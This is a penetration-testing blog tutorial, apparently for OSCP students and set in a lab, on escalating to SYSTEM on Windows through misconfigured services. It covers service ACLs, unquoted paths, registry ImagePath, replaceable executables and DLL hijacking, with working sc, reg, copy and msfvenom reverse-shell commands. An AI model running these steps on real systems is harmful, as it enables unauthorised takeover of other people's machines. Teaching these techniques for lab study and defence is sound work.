@@ -1,0 +1,1077 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <title>Service Misconfiguration</title>
+    <meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta http-equiv="X-UA-Compatible" content="ie=edge" />
+
+<link rel="stylesheet" href="/application.56db8f450c98e200698def311092699a83c036dcc75dfef2c8f412f8f80c47af.css" integrity="sha256-VtuPRQyY4gBpje8xEJJpmoPANtzHXf7yyPQS&#43;PgMR68=" />
+
+
+
+
+
+<meta property="og:title" content="Service Misconfiguration" />
+<meta property="og:description" content="Privilege escalation is a common technique used by penetration testers to test unauthorised access to a system. One way to achieve privilege escalation is through service misconfigurations in Windows.
+A service is a program that runs in the background on a Windows system, and it can have a variety of functions such as managing network connections, printing, or running scheduled tasks. Services can be configured to run under different user accounts, and some may have higher privileges than others." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://localhost:1313/posts/privilege-escalation/windows/service-misconfigurations/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-02-23T13:41:42+03:00" />
+<meta property="article:modified_time" content="2023-02-23T13:41:42+03:00" />
+
+    <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Service Misconfiguration"/>
+<meta name="twitter:description" content="Privilege escalation is a common technique used by penetration testers to test unauthorised access to a system. One way to achieve privilege escalation is through service misconfigurations in Windows.
+A service is a program that runs in the background on a Windows system, and it can have a variety of functions such as managing network connections, printing, or running scheduled tasks. Services can be configured to run under different user accounts, and some may have higher privileges than others."/>
+
+    
+    
+<meta name="description" content="Service Misconfiguration" />
+
+
+    
+
+    
+        
+            
+            
+                
+                
+                
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-1QLV0H8G51"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-1QLV0H8G51', { 'anonymize_ip': false });
+}
+</script>
+
+            
+
+            
+            
+
+            
+            
+
+            
+            
+
+            
+
+            
+        
+    
+
+
+
+
+<script>
+      theme = localStorage.getItem('darkmode:color-scheme') || 'system';
+      if (theme == 'system') {
+        if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+          theme = 'dark';
+        } else {
+          theme = 'light';
+        }
+      }
+      document.documentElement.setAttribute('data-theme', theme);
+    </script>
+  </head>
+
+  <body class="type-posts kind-page" data-bs-spy="scroll" data-bs-target="#TableOfContents" data-bs-offset="80">
+    <div class="container-fluid bg-secondary wrapper">
+      
+      
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+
+
+
+
+  
+
+
+<nav class="navbar navbar-expand-xl top-navbar shadow " id="top-navbar">
+  <div class="container">
+    
+    <button class="navbar-toggler navbar-light" id="sidebar-toggler" type="button">
+      <i data-feather="sidebar"></i>
+    </button>
+    
+    <a class="navbar-brand" href="/">
+      narycyber</a>
+    <button
+      class="navbar-toggler navbar-light"
+      id="navbar-toggler"
+      type="button"
+      data-bs-toggle="collapse"
+      data-bs-target="#top-nav-items"
+      aria-label="menu"
+    >
+      <i data-feather="menu"></i>
+    </button>
+
+    <div class="collapse navbar-collapse dynamic-navbar" id="top-nav-items">
+      <ul class="nav navbar-nav ms-auto">
+        <li class="nav-item">
+          <a class="nav-link" href="/#home">Home</a>
+        </li>
+        
+          
+          
+            
+              
+              
+                <li class="nav-item">
+                  <a class="nav-link" href="/#about">About</a>
+                </li>
+              
+            
+            
+              
+              
+                <li class="nav-item">
+                  <a class="nav-link" href="/#skills">Skills</a>
+                </li>
+              
+            
+            
+              
+              
+                <li class="nav-item">
+                  <a class="nav-link" href="/#recent-posts">Recent Posts</a>
+                </li>
+              
+            
+            
+              
+              
+                <li class="nav-item">
+                  <a class="nav-link" href="/#experiences">Experiences</a>
+                </li>
+              
+            
+          
+        
+        
+          <div id="top-navbar-divider"></div>
+        
+        
+          <li class="nav-item">
+            <a class="nav-link" id="blog-link" href="/posts">Posts</a>
+          </li>
+        
+        
+        
+            
+        
+        
+        
+          <li class="nav-item dropdown">
+<a class="nav-link dropdown-toggle"  href="#" id="themeSelector" role="button"
+  data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+  <img id="navbar-theme-icon-svg" class="theme-icon" src="/icons/moon-svgrepo-com.svg" width=20 alt="Dark Theme">
+</a>
+<div id="themeMenu" class="dropdown-menu dropdown-menu-icons-only" aria-labelledby="themeSelector">
+  <a class="dropdown-item nav-link" href="#" data-scheme="light">
+    <img class="theme-icon" src="/icons/sun-svgrepo-com.svg" width=20 alt="Light Theme">
+  </a>
+  <a class="dropdown-item nav-link" href="#" data-scheme="dark">
+    <img class="theme-icon" src="/icons/moon-svgrepo-com.svg" width=20 alt="Dark Theme">
+  </a>
+  <a class="dropdown-item nav-link" href="#" data-scheme="system">
+    <img class="theme-icon" src="/icons/computer-svgrepo-com.svg" width=20 alt="System Theme">
+  </a>
+</div>
+</li>
+
+        
+      </ul>
+    </div>
+  </div>
+  
+  
+  
+</nav>
+
+
+
+      
+      
+  <section class="sidebar-section" id="sidebar-section">
+    <div class="sidebar-holder">
+      <div class="sidebar" id="sidebar">
+        <form class="mx-auto" method="get" action="/search">
+          <input type="text" name="keyword" value="" placeholder="Search" data-search="" id="search-box" />
+        </form>
+        <div class="sidebar-tree">
+          <ul class="tree" id="tree">
+            <li id="list-heading"><a href="/posts/" data-filter="all">Posts</a></li>
+            <div class="subtree">
+                
+  
+  
+  
+  
+  
+    
+    <li><a class=" list-link" href="/posts/welcome/" title="Hey, Welcome">Hey, Welcome</a></li>
+  
+
+  
+  
+  
+  
+  
+    
+    <li>
+      <i data-feather="plus-circle"></i><a class=" list-link" href="/posts/api-penetration-testing/"> Api Penetration Testing</a>
+      
+      <ul class="">
+        
+  
+  
+  
+  
+  
+    
+    <li><a class=" list-link" href="/posts/api-penetration-testing/owasp-api-top10-vapi-walkthrough/" title="OWASP API10 via VAPI">OWASP API10 via VAPI</a></li>
+  
+
+
+      </ul>
+    </li>
+  
+
+  
+  
+  
+  
+    
+    
+  
+  
+    
+    <li>
+      <i data-feather="minus-circle"></i><a class="active list-link" href="/posts/privilege-escalation/"> Privilege Escalation</a>
+      
+      <ul class="active">
+        
+  
+  
+  
+  
+  
+    
+    <li>
+      <i data-feather="plus-circle"></i><a class=" list-link" href="/posts/privilege-escalation/linux/"> Linux</a>
+      
+      <ul class="">
+        
+  
+  
+  
+  
+  
+    
+    <li><a class=" list-link" href="/posts/privilege-escalation/linux/sudo-exploitation/" title="Sudo Exploitation">Sudo Exploitation</a></li>
+  
+
+
+      </ul>
+    </li>
+  
+
+  
+  
+  
+  
+    
+    
+  
+  
+    
+    <li>
+      <i data-feather="minus-circle"></i><a class="active list-link" href="/posts/privilege-escalation/windows/"> Windows</a>
+      
+      <ul class="active">
+        
+  
+  
+  
+  
+  
+    
+    <li><a class=" list-link" href="/posts/privilege-escalation/windows/setting-up-a-lab/" title="Setting Up a lab">Setting Up a lab</a></li>
+  
+
+  
+  
+  
+  
+    
+    
+  
+  
+    
+    <li><a class="active list-link" href="/posts/privilege-escalation/windows/service-misconfigurations/" title="Service Misconfiguration">Service Misconfiguration</a></li>
+  
+
+
+      </ul>
+    </li>
+  
+
+
+      </ul>
+    </li>
+  
+
+  
+  
+  
+  
+  
+    
+    <li><a class=" list-link" href="/posts/vulnhub/" title="Vulnhub walkthrough">Vulnhub walkthrough</a></li>
+  
+
+  
+  
+  
+  
+  
+    
+    <li>
+      <i data-feather="plus-circle"></i><a class=" list-link" href="/posts/toolkit/"> Toolkit</a>
+      
+      <ul class="">
+        
+  
+  
+  
+  
+  
+    
+    <li><a class=" list-link" href="/posts/toolkit/accesschk.exe/" title="Accesschk.exe">Accesschk.exe</a></li>
+  
+
+
+      </ul>
+    </li>
+  
+
+
+            </div>
+          </ul>
+        </div>
+      </div>
+    </div>
+  </section>
+
+
+      
+      
+<section class="content-section" id="content-section">
+  <div class="content">
+    <div class="container p-0 read-area">
+      
+      <div class="hero-area col-sm-12" id="hero-area" style='background-image: url(/posts/privilege-escalation/windows/service-misconfigurations/hero.png);'>
+      </div>
+
+      
+      <div class="page-content">
+        
+        <div class="author-profile ms-auto align-self-lg-center">
+          <img class="rounded-circle" src='/images/author/justus_hu21da735d27193e38d6c7d690c3134560_66867_120x120_fit_box_3.png' alt="Author Image">
+          <h5 class="author-name">Justus Juvenary</h5>
+          <p class="text-muted">Thursday, February 23, 2023</p>
+        </div>
+        
+        
+        <div class="title">
+          <h1>Service Misconfiguration</h1>
+        </div>
+
+        
+
+        
+        <div class="post-content" id="post-content">
+          <p>Privilege escalation is a common technique used by penetration testers to test unauthorised access to a system. One way to achieve privilege escalation is through service misconfigurations in Windows.</p>
+<p>A service is a program that runs in the background on a Windows system, and it can have a variety of functions such as managing network connections, printing, or running scheduled tasks. Services can be configured to run under different user accounts, and some may have higher privileges than others. <strong>If services run with SYSTEM privileges and are misconfigured, exploiting them may lead to command execution with SYSTEM privileges too.</strong></p>
+<p><strong>In this blog post, we&rsquo;ll discuss these Service Misconfigurations:</strong></p>
+<pre tabindex="0"><code>
+1.  Insecure Service Properties
+2.  Unquoted Service Path
+3.  Weak Registry Permissions
+4.  Insecure Service Executables
+5.  DLL Hijacking.
+</code></pre><h3 id="the-following-are-service-commands-that-will-be-used">The following are service commands that will be used.</h3>
+<ul>
+<li>
+<p>To query the configuration of a service: <code>sc.exe qc &lt;service name&gt;</code></p>
+</li>
+<li>
+<p>To query the current status of a service: <code>sc.exe query &lt;service name&gt;</code></p>
+</li>
+<li>
+<p>To modify a configuration option of a service:
+<code>sc.exe config &lt;service name&gt; &lt;option&gt;= &lt;value&gt;</code>. Please leave one space after equal sign.</p>
+</li>
+<li>
+<p>To start a service: <code>net start &lt;service name&gt;</code></p>
+</li>
+<li>
+<p>To stop a service: <code>net stop &lt;service name&gt;</code></p>
+</li>
+</ul>
+<p><code>Note:</code> To follow along or get the best out of this blog, please check how to set up a <a href="https://www.narycyber.com/posts/privilege_escalation/windows_privesc/introduction/" target="_blank" rel="noopener">virtual lab</a> that we are going to be using. After having your lab set up, now let&rsquo;s go through each type of service misconfiguration.</p>
+<p> </p>
+<h2 id="insecure-service-permissions">Insecure service permissions</h2>
+<p>Permissions to access a certain resource in Windows are controlled by the access control list (ACL) for that resource. Each service has an ACL that defines certain service-specific permissions.</p>
+<ul>
+<li>
+<p>Some permissions are harmless because they can&rsquo;t give us a way to run executable files (e.g. <code>SERVICE_QUERY_CONFIG, SERVICE_QUERY_STATUS</code>).</p>
+</li>
+<li>
+<p>Some may be useful (e.g. <code>SERVICE_STOP, SERVICE_START</code>).</p>
+</li>
+<li>
+<p>Some are dangerous (e.g. <code>SERVICE_CHANGE_CONFIG, SERVICE_ALL_ACCESS</code>) because If our user has permission to change the configuration of a service which runs with SYSTEM privileges, we can change the executable the service uses to one of our own.</p>
+</li>
+</ul>
+<p><em><strong>NOTE :</strong></em>  <code>If we cannot stop/start the service, we may not be able to escalate privileges! This applies to all service privilege escalation.</code></p>
+<h4 id="steps-to-exploit-this-misconfiguration">Steps to exploit this misconfiguration</h4>
+<h5 id="step-1">Step 1</h5>
+<p>Run winPeas to enumerate and identify potential vulnerabilities in a Windows system.</p>
+<p><code>.\winPEASany.exe quiet servicesinfo</code></p>
+<p>The above command runs WinPEAS in quiet mode and specifically focuses on gathering information about Windows services. Running this command, WinPEAS will enumerate all installed Windows services and provide information about their status, display name, service name, path, and description. Additionally, it will look for services with weak permissions or misconfigured service binaries that may be vulnerable to privilege escalation.</p>
+<p>By default, WinPEAS will save the output to a file named <code>winPEAS.&lt;timestamp&gt;.txt</code> in the current directory. You can use the <code>&gt;</code> operator to redirect the output to a different file or location.</p>
+<h5 id="step-2">Step 2</h5>
+<p>After running the above command, we can read the output file and identify service permissions of our user to check if there is a service with SYSTEM privileges and we have permission to modify it.</p>
+<p><em>If you are using the virtual lab we created before, after running the above command we can verify this on the winpeas output.</em></p>
+<p><img src="Screenshotfrom2023-02-1415-54-39.png" alt="daclsvc_service"></p>
+<p>In the above screenshot, we can see <code>daclsvc service</code> can be modified. This can also be confirmed on the modifiable services section on winpeas file.</p>
+<h5 id="step-3">Step 3</h5>
+<p>Verify if the above service is modifiable with accesschk. For more about accesschk tool and how to use it, please check <strong><a href="https://www.narycyber.com/posts/toolkit/accesschk.exe/" target="_blank" rel="noopener">accesschk</a></strong> write-up.</p>
+<p>Run this command to check more info about the service <code>.\accesschk.exe -uwcqv user daclsvc</code></p>
+<p><img src="Screenshotfrom2023-02-1415-57-43.png" alt="permission_output"> From the above output, we can see the permissions we have. However, the two most important permissions are to start/stop the service and to change the configuration of the service.</p>
+<h5 id="step-4">Step 4.</h5>
+<p>Enumerate this service to see more information and check its current status.</p>
+<ul>
+<li>To enumerate this service, use the command <code>sc qc daclsvc</code></li>
+<li>To check the status of the service, use the command <code>sc query daclsvc</code></li>
+</ul>
+<p>As we can see from the output of our commands: <img src="Screenshotfrom2023-02-1416-06-48.png" alt="service_output"> From the above results:</p>
+<ul>
+<li>The service is configured to demand start, meaning it has to be started manually.</li>
+<li>The binary path name points to daclservice.exe.</li>
+<li>The service has no dependencies.</li>
+<li>It should also run with the permissions of LocalSystem.</li>
+<li>The service is currently stopped, meaning after we reconfigure the service, we can start it to trigger the exploit.</li>
+</ul>
+<h5 id="step-5">Step 5.</h5>
+<p>Since we have the permission to configure the service, we can configure the binary path to the path of our reverse shell payload. To achieve that, run <code>sc config daclsvc binpath=&quot;\C:\PrivEsc\reverse.exe\&quot;</code> (set the path to your reverse shell path).</p>
+<h5 id="step-6">Step 6.</h5>
+<p>Start a listener with netcat: <img src="Screenshotfrom2023-02-1416-10-35.png" alt="listerner"></p>
+<h5 id="step-7">Step 7.</h5>
+<p>Start a service where our reverse shell payload will be executed: <img src="Screenshotfrom2023-02-1416-12-14.png" alt="service_and_listener"></p>
+<p>As you can see from the above, we have a reverse shell with system privileges.</p>
+<p> </p>
+<h2 id="unquoted-service-path">Unquoted Service Path</h2>
+<p>In Windows, it is possible to run executable files without specifying their file extension, for example, running <code>&quot;ipconfig.exe&quot;</code> by typing <code>&quot;ipconfig&quot;</code>. However, some executables require additional arguments to be passed to them, separated by spaces, such as <code>&quot;program.exe arg1 arg2 arg3...&quot;</code>. This can create ambiguity when using absolute paths that contain spaces and are unquoted, which can cause the wrong executable to be run.</p>
+<p>Suppose we have an unquoted path in Windows, such as
+<code>&quot;C:\Program Files\Directory DirName\Program.exe&quot;</code>. While it&rsquo;s clear to us that the intended executable is Program.exe, Windows may interpret <code>&quot;C:\Program&quot;</code> as the executable with two arguments: <code>&quot;Files\Directory&quot;</code> and <code>&quot;DirName\Program.exe&quot;</code>. or <code>&quot;C:\Program Files\Directory&quot;</code> as the executable with argument <code>&quot;DirName\Program.exe&quot;</code>.</p>
+<p>To resolve this ambiguity, Windows checks each of the possible executable paths in turn. This creates a security vulnerability, as an attacker could potentially trick a service into running a malicious executable instead of the intended one by writing the malicious file to a location that Windows checks before the actual executable.</p>
+<h4 id="steps-to-exploit-this-misconfiguration-1">Steps to exploit this misconfiguration.</h4>
+<p>From the winpeas output that we run before (<code>.\winPEASany.exe quiet servicesinfo</code>) we can see this misconfiguration on service information section.
+<img src="Screenshotfrom2023-02-1711-54-16.png" alt="winpeasy_png"></p>
+<h5 id="step-1-1">Step 1.</h5>
+<p>Query the configuration of the service <code>sc qc unquotedsvc</code>
+Here is the output.
+<img src="Pastedimage20230217120701.png" alt="unqoutedsvc"></p>
+<ul>
+<li>From the output of our query, the path is
+<code>C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe</code></li>
+<li>It has LocalSystem privileges, meaning if we can run our reverse shell payload, we will have System privileges.</li>
+<li>It demands start</li>
+</ul>
+<h5 id="step-2-1">Step 2.</h5>
+<p>Use accesschk.exe to see if we have permission to start the service (if we don&rsquo;t, then we can&rsquo;t exploit it even if it is vulnerable), and writable permission.</p>
+<p>Checking if we have permission to start the service.</p>
+<ul>
+<li><code>.\accesschk.exe -ucqv user unquotedsvc</code>
+<img src="Pastedimage20230217122025.png" alt="-ucqv_png">
+We can see that we have permission to start and stop the service.</li>
+</ul>
+<h5 id="step-3-1">Step 3.</h5>
+<p>Using accesschk.exe to check for writable permissions of <code>C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe</code></p>
+<ul>
+<li>Check write permission of <code>C:\</code> run <code>.\accesschk.exe -uwdq C:\</code></li>
+<li>Check write permission of <code>C:\Program Files\</code> run <code>.\accesschk.exe -uwdq &quot;C:\Program Files\&quot;</code></li>
+<li>Check write permission of <code>C:\Program Files\Unquoted Path Service\Common Files</code> run <code>.\accesschk.exe -uwdq &quot;C:\Program Files\Unquoted Path Service\&quot;</code></li>
+</ul>
+<p><img src="writeperm.png" alt="writable_perm"> From the above results, we can see the <code>C:\Program Files\Unqouted Path Service</code> directory all <code>BUILTIN\Users</code> have the <code>RW</code> permissions This means, if we create a file in this directory, when the service starts, it will execute.</p>
+<h5 id="step-4-1">Step 4.</h5>
+<p>Let&rsquo;s copy our reverse shell into this directory where we have write permission. <code>copy C:\PrivEsc\reversee.exe &quot;C:\Program Files\Unquoted Path Service\reversee.exe&quot;</code>  (change the reversee.exe to the name of your reverse shell) <img src="Pastedimage20230220105815.png" alt="reverse_shell"></p>
+<h5 id="step-5-1">Step 5.</h5>
+<p>Set up a listener on a Linux machine and start the service. <img src="Pastedimage20230220110237.png" alt="listener_png"> From the above result, we&rsquo;ve got the shell back with system privileges.</p>
+<p> </p>
+<h2 id="weak-registry-permissions">Weak Registry Permissions</h2>
+<p>Weak registry permissions relate to access control issues in the Windows registry, which acts as a central database that stores configuration settings for the operating system and applications. Specifically, weak registry permissions imply that the permissions given to certain registry keys or values are excessively permissive, granting non-administrator users or attackers the ability to modify or delete critical registry entries. This can result in numerous security concerns such as privilege escalation, persistence, and the ability to execute malicious code.</p>
+<p>Misconfigured Access Control Lists (ACLs) on registry entries can enable an attacker to modify a service&rsquo;s configuration, even if they do not have direct access to modify the service itself.</p>
+<p>The following are steps to exploit this misconfiguration. Using our lab and the result of winpeas (<code>.\winPEASany.exe quiet servicesinfo</code>) <img src="Pastedimage20230220113756.png" alt="winpeasy_png"> As it appears our user can modify the registry entry of regsvc service.</p>
+<h4 id="step-1-2">Step 1.</h4>
+<p>Verify the permissions</p>
+<ul>
+<li>using Powershell run <code>PS&gt; Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc | Format-List</code> <img src="Screenshotfrom2023-02-2011-47-34.png" alt="verify_perm"> From the results above, we can see that <code>NT AUTHORUTY\INTERACTIVE</code> has full control.</li>
+</ul>
+<h4 id="step-2-2">Step 2.</h4>
+<ul>
+<li>
+<p>Use accesschk to see if we can stop or start a service. <code>.\accesschk.exe -ucqv user regsvc</code> <img src="Pastedimage20230220120807.png" alt="access_png"> From the above picture, it appears that we do have permission to start and stop the service.</p>
+</li>
+<li>
+<p>Let&rsquo;s check the current values of the regsvc. <code>reg query HKLM\System\CurrentControlSet\Services\regsvc</code> <img src="Pastedimage20230220121420.png" alt="current_value"> From the results, it appears that the ImagePath is set to <code>&quot;C:\Program Files\Insecure Registry Service\insecureregistryservice.exe&quot;</code> and it executes with localsystem privileges.</p>
+</li>
+</ul>
+<p>Step 3:
+Overwrite the ImagePath registry key to point to our reverse shell executable: <code>reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reversee.exe /f</code> <img src="Pastedimage20230220122229.png" alt="overwrite_png"></p>
+<p>Step 4.
+Set up a listener on a Linux machine and start the service. <img src="Pastedimage20230220122452.png" alt="listener_png"> As we can see above, we have got the shell back with system privileges.</p>
+<h2 id="insecure-service-executables">Insecure Service Executables</h2>
+<p>Insecure Service Executables are a common vulnerability that can be exploited by attackers to escalate their privileges on a system. A service executable is a programme that runs in the background and provides functionality to other programmes or users on the system. If a service executable is not properly secured, an attacker can potentially exploit it to gain elevated privileges on the system.</p>
+<p>There are several ways that an insecure service executable can lead to privilege escalation. For example, an attacker may be able to exploit a buffer overflow or other vulnerability in the service to execute arbitrary code with elevated privileges. Alternatively, the attacker may be able to <strong>replace the legitimate service executable with a malicious one that provides them with elevated privileges.</strong></p>
+<p>As we can see in the output of WinPEAS (<code>.\winPEASany.exe quiet servicesinfo</code>): <img src="Screenshotfrom2023-02-2013-13-08.png" alt="wipeas_result"></p>
+<h3 id="steps-to-exploit-this-misconfiguration-2">Steps to exploit this misconfiguration:</h3>
+<h5 id="step-1-3">Step 1.</h5>
+<p>Use Accesschk.exe to check the permissions of the executable: <code>.\accesschk.exe -uqvw &quot;C:\Program Files\File Permissions Service\filepermservice.exe&quot;</code> <img src="Pastedimage20230220131903.png" alt="accesschk_result"></p>
+<ul>
+<li>From the above output, we have all permissions of the file.</li>
+</ul>
+<h4 id="step-2-3">Step 2.</h4>
+<p>Check if we can start and stop the service: Run <code>.\accesschk.exe -quvc filepermsvc</code></p>
+<p><img src="Pastedimage20230220132229.png" alt="start_stop_check"></p>
+<ul>
+<li>From the output above, we can start and stop the service</li>
+<li>We can configure the service.</li>
+</ul>
+<h5 id="step-3-2">Step 3.</h5>
+<p>Backup the original file: <code>copy &quot;C:\Program Files\File Permissions Service\filepermservice.exe&quot; C:\Temp</code></p>
+<h4 id="step-4-2">Step 4.</h4>
+<p>Copy the reverse shell executable and overwrite the original executable. Use the following command. Change the name of the reverse shell payload to yours: <code>copy C:\PrivEsc\reversee.exe &quot;C:\Program Files\File Permissions Service\filepermservice.exe&quot;</code> <img src="Pastedimage20230220132757.png" alt="copy_reverse"></p>
+<h5 id="step-5-2">Step 5.</h5>
+<p>Set up a listener on a Linux virtual machine and start the service: <img src="Pastedimage20230220133015.png" alt="listerner"></p>
+<ul>
+<li>As you can see in the above output, we have the authority/system privileges.</li>
+<li>Restore the original file.</li>
+</ul>
+<h2 id="dll-hijacking">DLL Hijacking</h2>
+<p>DLL hijacking is a type of attack that involves replacing a legitimate Dynamic Link Library (DLL) with a malicious one in order to execute unauthorised code on a system. This attack can be used to escalate privileges on a system.</p>
+<p>DLL hijacking can be used as part of a privilege escalation attack if the attacker is able to replace a DLL that is loaded by a process running with higher-level privileges, such as an administrative account or a system service.</p>
+<p>When the malicious DLL is loaded by the targeted process, it can execute arbitrary code with the same level of privileges as the process. This can allow an attacker to perform actions that would normally be restricted, such as accessing sensitive data or running commands with elevated privileges.</p>
+<p>As we can see from the WinPEAS output of our testing lab (<code>.\winPEASany.exe quiet servicesinfo</code>): <img src="Pastedimage20230220133228.png" alt="winpeas_dll"></p>
+<p><img src="Pastedimage20230220133544.png" alt="winpeas_dll2"></p>
+<h2 id="steps-to-exploit-this-misconfiguration-3">Steps to exploit this misconfiguration.</h2>
+<h5 id="step-1-4">Step 1.</h5>
+<p>Enumerate all services in the WinPEAS output to see which one our user can start and stop.</p>
+<ul>
+<li>For the sake of the length of this blog, I am going to only focus on dllsvc, and here is the output.</li>
+<li>From the WinPEAS output, the dllsvc runs at this path <code>&quot;C:\Program Files\DLL Hijack Service\dllhijackservice.exe&quot;</code></li>
+</ul>
+<p><img src="Pastedimage20230220133803.png" alt="enumlate_dllsvc"></p>
+<ul>
+<li>We can start and stop the dllsvc from the above output.</li>
+</ul>
+<h5 id="step-2-4">Step 2.</h5>
+<p>Query the configuration of the service for more information. <code>sc qc dllsvc</code> <img src="Pastedimage20230220134341.png" alt="sc_qc"></p>
+<p>From the above output:</p>
+<ul>
+<li>It requires demand_start</li>
+<li>The binary path name is <code>C:\Program Files\DLL Hijack Service\dlljackservice.exe</code></li>
+<li>It has local system privileges.</li>
+</ul>
+<h5 id="step-3-3">Step 3.</h5>
+<p>We have to copy this file (<code>dllhijackservice.exe</code>) into the Windows machine that we have administrator privileges to investigate the program more.</p>
+<ul>
+<li>In our lab, we can use our Windows virtual machine to test this, but in the real world, copy the file and investigate it more in another machine with admin privileges.</li>
+</ul>
+<h5 id="step-4-3">Step 4.</h5>
+<p>Use Procmon to investigate more about the service. <img src="procmon.png" alt="provmon"></p>
+<h5 id="step-5-3">Step 5.</h5>
+<p>Configure Procmon64.exe as follows:</p>
+<ul>
+<li>
+<p>Run it with administrator privileges. Use the password of the admin which is <code>password123</code>. Stop and clear the current capture</p>
+</li>
+<li>
+<p>Press Ctrl+L to open the Filter menu.</p>
+</li>
+<li>
+<p>Add a new filter on the Process Name matching dllhijackservice.exe. <img src="filterpocmon.png" alt="filter_png"></p>
+</li>
+<li>
+<p>On the main screen, deselect registry activity and network activity. <img src="start_capture.png" alt="capture_release"></p>
+</li>
+</ul>
+<h5 id="step-6-1">Step 6.</h5>
+<ul>
+<li>Start the service in the Windows virtual machine. <code>net start dllsvc</code> <img src="start_service.png" alt="start_service"></li>
+</ul>
+<h5 id="step-7-1">Step 7.</h5>
+<p>Investigate the result of Pocmon capture. <img src="hijackme.png" alt="investigatation"></p>
+<p>From the output:</p>
+<ul>
+<li>We can see the number of NOT FOUND error messages for hijackme.dll file</li>
+<li>We can see Windows is trying to go into each folder to find the file, and at some point, it went into <code>C:\Temp\</code> folder <code>where we have write permission</code> to find hijackme.dll file</li>
+<li>We can create our file with a reverse shell named hijackme.dll and put it in this folder, and Windows will execute it.</li>
+</ul>
+<h5 id="step-8">Step 8.</h5>
+<p>Create DLL reverse shell in Linux using this command
+<code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.217 LPORT=7676 -f dll -o hijackme.dll</code></p>
+<ul>
+<li>Please change the IP address of the command to yours and port number to the one you want to listen to.</li>
+<li>Transfer this file into the <code>C:\Temp</code> folder by <code>copy \\192.168.1.217\tools\hijackme.dll C:\Temp\</code></li>
+</ul>
+<h5 id="step-9">Step 9.</h5>
+<ul>
+<li>
+<p>Create a listener on your Linux machine</p>
+</li>
+<li>
+<p>Stop the dllsvc service and restart it again.
+<img src="listerner_final.png" alt="listerner"></p>
+</li>
+</ul>
+<p>In the above output, we can see we have successfully escalated our privileges.</p>
+<p>Congratulations for making it to the end of this lengthy post. The above step-by-step explanation of how to exploit service misconfigurations can be used on any Windows system. To deepen your knowledge, check out TIb3rius course called <strong>Windows Privilege Escalation for OSCP &amp; Beyond!</strong></p>
+
+        </div>
+
+        
+        <div class="row ps-3 pe-3">
+        
+          <div class="col-md-6 share-buttons">
+          
+          </div>
+
+        
+        
+          
+            
+          
+          <div class="col-md-6 btn-improve-page">
+             
+               <a href="https://github.com/hugo-toha/hugo-toha.github.io/edit/main/content/posts/Privilege%20Escalation/Windows/Service%20Misconfigurations/index.md" title="Improve this page" target="_blank" rel="noopener">
+            
+                <i class="fas fa-code-branch"></i>
+                Improve this page
+              </a>
+          </div>
+        
+        </div>
+
+
+
+      
+      <hr />
+        
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+    
+    
+  
+  
+
+  
+  
+
+  
+  
+
+
+<div class="row next-prev-navigator">
+  
+    <div class="col-md-6 previous-article">
+      <a href="/posts/privilege-escalation/windows/setting-up-a-lab/" title="Windows Privilege Escalation lab" class="btn filled-button">
+        <div><i class="fas fa-chevron-circle-left"></i> Prev</div>
+        <div class="next-prev-text">Windows Privilege Escalation lab</div>
+      </a>
+    </div>
+  
+  
+      
+      
+        
+      
+      <div class="col-md-6 next-article">
+        <a href="/posts/vulnhub/" title="Vulnhub" class="btn filled-button">
+          <div>Next <i class="fas fa-chevron-circle-right"></i></div>
+          <div class="next-prev-text">Vulnhub</div>
+        </a>
+      </div>
+    
+</div>
+
+      <hr />
+
+      
+      
+
+      
+      
+
+      </div>
+    </div>
+  </div>
+  
+  <a id="scroll-to-top" class="btn" type="button" data-bs-toggle="tooltip" data-bs-placement="left" title="Scroll to top">
+    <i class="fas fa-chevron-circle-up"></i>
+  </a>
+</section>
+
+
+      
+      
+  <section class="toc-section" id="toc-section">
+    
+    <div class="toc-holder">
+      <h5 class="text-center ps-3">Table of Contents</h5>
+      <hr>
+      <div class="toc">
+        <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#the-following-are-service-commands-that-will-be-used">The following are service commands that will be used.</a></li>
+      </ul>
+    </li>
+    <li><a href="#insecure-service-permissions">Insecure service permissions</a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#steps-to-exploit-this-misconfiguration">Steps to exploit this misconfiguration</a>
+              <ul>
+                <li><a href="#step-1">Step 1</a></li>
+                <li><a href="#step-2">Step 2</a></li>
+                <li><a href="#step-3">Step 3</a></li>
+                <li><a href="#step-4">Step 4.</a></li>
+                <li><a href="#step-5">Step 5.</a></li>
+                <li><a href="#step-6">Step 6.</a></li>
+                <li><a href="#step-7">Step 7.</a></li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#unquoted-service-path">Unquoted Service Path</a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#steps-to-exploit-this-misconfiguration-1">Steps to exploit this misconfiguration.</a>
+              <ul>
+                <li><a href="#step-1-1">Step 1.</a></li>
+                <li><a href="#step-2-1">Step 2.</a></li>
+                <li><a href="#step-3-1">Step 3.</a></li>
+                <li><a href="#step-4-1">Step 4.</a></li>
+                <li><a href="#step-5-1">Step 5.</a></li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#weak-registry-permissions">Weak Registry Permissions</a>
+      <ul>
+        <li>
+          <ul>
